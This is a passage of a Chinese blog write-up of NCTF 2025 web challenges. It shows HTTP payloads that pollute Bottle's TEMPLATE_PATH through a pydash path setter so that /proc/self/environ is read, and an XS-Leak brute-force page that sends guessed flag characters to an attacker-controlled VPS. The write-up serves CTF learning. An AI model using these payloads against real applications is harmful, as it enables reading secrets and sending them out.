+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=pydash HTTP/1.1</span><br><span class="line">&#123;</span><br><span class="line">&quot;path&quot;: &quot;helpers.RESTRICTED_KEYS&quot;,</span><br><span class="line">&quot;value&quot;: &quot;never gonna give you up&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18799383/09.png"></p>
+<p>成功污染。</p>
+<p>再打一次上述setval找__globals__的payload。我们尝试往__globals__里塞一个变量看看。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=setval HTTP/1.1</span><br><span class="line">&#123;</span><br><span class="line">&quot;path&quot;: &quot;__globals__.aaa&quot;,</span><br><span class="line">&quot;value&quot;: 111</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打断点看看</p>
+<p><img src="/images/migrated/18799383/10.png"></p>
+<p>winwinwin</p>
+<p>随后我们看看bottle有啥好改的。因为我们可以直接render任意template，所以就聚焦在template上就行了。</p>
+<p>这里不难注意到：</p>
+<p><img src="/images/migrated/18799383/11.png"></p>
+<p>这个TEMPLATE_PATH有点意思。我们跟进看看。</p>
+<p><img src="/images/migrated/18799383/12.png"></p>
+<p>可以看到TEMPLATE_PATH就是bottle在lookup查找template时的路径。它也是一个常量，定义如下：</p>
+<p><img src="/images/migrated/18799383/13.png"></p>
+<p>我们往里面加一个<code>/proc/1/</code>他就会从<code>/proc/1/</code>里找template。随后我们render的时候参数输入<code>environ</code>。它就会以为<code>/proc/1/environ</code>是一个模板，render之后给我们返回。我们就能从环境变量里看到flag</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=setval HTTP/1.1</span><br><span class="line">&#123;</span><br><span class="line">&quot;path&quot;: &quot;__globals__.bottle.TEMPLATE_PATH&quot;,</span><br><span class="line">&quot;value&quot;: [&quot;./&quot;,&quot;./views/&quot;,</span><br><span class="line">	&quot;/proc/self/&quot;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随后直接render?path&#x3D;environ即可</p>
+<h1 id="internal-api"><a href="#internal-api" class="headerlink" title="internal_api"></a>internal_api</h1><p>是一个很基础的XSLEAK。我们能找到一篇文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/allway2/article/details/126703565">https://blog.csdn.net/allway2/article/details/126703565</a></p>
+<p><img src="/images/migrated/18799383/14.png"></p>
+<p>到这我觉得应该都会了（（（</p>
+<p>搓一个POC看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Error-Based Attack&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    function checkError(url) &#123;</span><br><span class="line">        let script = document.createElement(&#x27;script&#x27;)</span><br><span class="line">        script.src = url</span><br><span class="line">        script.onload = () =&gt; window.open(&quot;http://101.43.48.199:8000/1&quot;);</span><br><span class="line">        script.onerror = () =&gt; window.open(&quot;http://101.43.48.199:8000/2&quot;);</span><br><span class="line">        document.head.appendChild(script)</span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">      checkError(&#x27;http://0.0.0.0:8000/internal/search?s=nctf&#123;&#x27;)</span><br><span class="line">      checkError(&#x27;http://0.0.0.0:8000/internal/search?s=somethingwrong&#x27;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>显然该flag字符串含有<code>nctf{</code>，因此第一次查询的时候能查到，触发onload，访问到&#x2F;1。第二次是我随便写的，flag字符串里不含有<code>somethingwrong</code>，因此返回错误的状态码，触发onerror，访问到&#x2F;2</p>
+<p>vps起一个这个服务，让bot访问一下看看。</p>
+<p><img src="/images/migrated/18799383/15.png"></p>
+<p>POC成立。</p>
+<p>随后就是逐字符爆破即可</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Error-Based Attack&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        let currentFlag = &quot;nctf&#123;&quot;;</span><br><span class="line">        const chars = &quot;abcdef0123456789-&#123;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">        function sleep(ms) &#123;</span><br><span class="line">            return new Promise(resolve =&gt; setTimeout(resolve, ms));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function checkCharacter(char) &#123;</span><br><span class="line">            return new Promise((resolve) =&gt; &#123;</span><br><span class="line">                let script = document.createElement(&#x27;script&#x27;);</span><br><span class="line">                script.src = `http://0.0.0.0:8000/internal/search?s=$&#123;currentFlag&#125;$&#123;char&#125;`;</span><br><span class="line"></span><br><span class="line">                script.onload = () =&gt; &#123;</span><br><span class="line">                    document.head.removeChild(script);</span><br><span class="line">                    resolve(true);</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                script.onerror = () =&gt; &#123;</span><br><span class="line">                    document.head.removeChild(script);</span><br><span class="line">                    resolve(false);</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                document.head.appendChild(script);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        async function bruteforce() &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                while (!currentFlag.endsWith(&#x27;&#125;&#x27;)) &#123;</span><br><span class="line">                    for (let char of chars) &#123;</span><br><span class="line">                        const isCorrect = await checkCharacter(char);</span><br><span class="line">                        if (isCorrect) &#123;</span><br><span class="line">                            currentFlag += char;</span><br><span class="line">                            window.open(`http://VPS:8000/?flag=$&#123;currentFlag&#125;`);</span><br><span class="line">                            await sleep(50);</span><br><span class="line">                            break;</span><br><span class="line">                        &#125;</span><br><span class="line">                        await sleep(50);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                window.open(`http://VPS:8000/?error=$&#123;currentFlag&#125;`);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bruteforce();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>VPS起服务，bot访问</p>
+<p><img src="/images/migrated/18799383/16.png"></p>
+<h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>这次真没怎么好好打。尤其是internal_api那个题。那个题放hint的时候我已经去学校了（单休）5：30放学回来看这题已经被打烂掉才去看的XSLEAK。最后还搞得我数学周考迟到（（（但是很有趣的是我着急忙慌地把POC搓出来了，然后扔给我做re和pwn的队友，他们居然顺着我的POC把exp写出来了，简直就是大王。</p>
+<p>最后附一个队名的来源（笑）：</p>
+<p><img src="/images/migrated/18799383/17.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap-master"><span class="toc-number">1.</span> <span class="toc-text">sqlmap_master</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezdash"><span class="toc-number">2.</span> <span class="toc-text">ezdash</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezdash-revenge"><span class="toc-number">3.</span> <span class="toc-text">ezdash_revenge</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#internal-api"><span class="toc-number">4.</span> <span class="toc-text">internal_api</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%90%8E%E9%9D%A2"><span class="toc-number">5.</span> <span class="toc-text">写在后面</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&text=nctf 2025 web wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&title=nctf 2025 web wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&is_video=false&description=nctf 2025 web wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=nctf 2025 web wp&body=Check out this article: https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&title=nctf 2025 web wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&title=nctf 2025 web wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&title=nctf 2025 web wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&title=nctf 2025 web wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&name=nctf 2025 web wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-03-29-nctf-2025-web-wp/&t=nctf 2025 web wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
